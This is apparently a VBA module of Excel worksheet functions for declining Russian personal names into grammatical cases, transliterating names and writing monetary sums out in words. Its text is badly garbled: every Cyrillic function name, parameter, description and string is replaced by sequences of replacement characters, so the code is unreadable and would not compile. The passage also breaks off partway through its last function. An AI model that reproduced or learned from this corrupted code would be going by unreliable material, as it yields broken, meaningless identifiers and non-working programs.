Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = CropFIO(|fffd||fffd||fffd|, True)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(GenitiveCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(DativeCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(InstrumentalCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd|$, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = RepairFIOcase(AccusativeCase(|fffd||fffd||fffd|_|fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd|$, |fffd||fffd||fffd|$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$))
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    FIO$ = Application.Trim(Replace(Replace(Replace(|fffd||fffd||fffd|, " - ", "-"), " -", "-"), "- ", "-"))
    arr = Split(Application.Trim(FIO$))
    If UBound(arr) = 0 Then |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = |fffd||fffd||fffd|: Exit Function
    arr(0) = ""
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Trim(Join(arr))
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|Sidorov Ivan Andreevitch|fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Translit$(|fffd||fffd||fffd||fffd||fffd|)
End Function

' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.\n\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 123 |fffd||fffd||fffd||fffd||fffd| 45 |fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Summ_RUS(|fffd||fffd||fffd||fffd||fffd|, 1, 1, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    s1 = Fix(Val(|fffd||fffd||fffd||fffd||fffd|))
    s2$ = Left(Split(Replace(|fffd||fffd||fffd||fffd||fffd| & "00", ",", ".") & ".00", ".")(1), 2)
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Trim(Propis_Summ_RUS(s1, 1)) & " " & s2$ & " |fffd||fffd||fffd|."
End Function

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| As Long)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = FractionalNumberToText(|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, True)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| As Long)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|. \n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 45 |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
